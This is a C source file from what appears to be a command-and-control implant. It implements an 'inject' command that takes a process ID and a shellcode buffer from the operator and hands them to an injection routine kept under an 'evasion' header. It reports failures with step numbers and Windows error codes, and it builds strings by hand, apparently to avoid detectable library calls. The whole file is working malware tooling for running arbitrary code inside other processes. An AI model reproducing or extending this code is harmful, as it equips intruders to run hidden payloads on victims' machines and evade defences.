#include "config.h"
#ifdef INCLUDE_CMD_INJECT

#include "commands.h"
#include "evasion/injection.h"

VOID cmd_inject(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD pid = parser_int32(args);
    DWORD sc_len = 0;
    BYTE* sc = parser_bytes(args, &sc_len);

    if (pid == 0 || !sc || sc_len == 0) {
        package_add_string(inst, response, XSTR("Usage: inject <pid> <shellcode>"));
        response->is_error = TRUE;
        return;
    }

    DWORD inject_step = 0;
    if (inject_shellcode(inst, pid, sc, sc_len, &inject_step)) {
        package_add_string(inst, response, XSTR("Shellcode injected"));
    } else {
        char errbuf[128] = {0};
        char* p = errbuf;
        const char* prefix = "Injection failed at step ";
        while (*prefix) *p++ = *prefix++;
        { char stmp[16]; int si = 0; DWORD sv = inject_step;
          if (sv == 0) { *p++ = '0'; }
          else { while (sv > 0) { stmp[si++] = '0' + (sv % 10); sv /= 10; } for (int j = si - 1; j >= 0; j--) *p++ = stmp[j]; }
        }
        DWORD gle = inst->Win32.GetLastError ? inst->Win32.GetLastError() : 0;
        const char* gl = " GLE=";
        while (*gl) *p++ = *gl++;
        char tmp[16]; int ti = 0;
        if (gle == 0) { *p++ = '0'; }
        else { while (gle > 0) { tmp[ti++] = '0' + (gle % 10); gle /= 10; } for (int j = ti - 1; j >= 0; j--) *p++ = tmp[j]; }
        package_add_string(inst, response, errbuf);
        response->is_error = TRUE;
    }
}

#endif
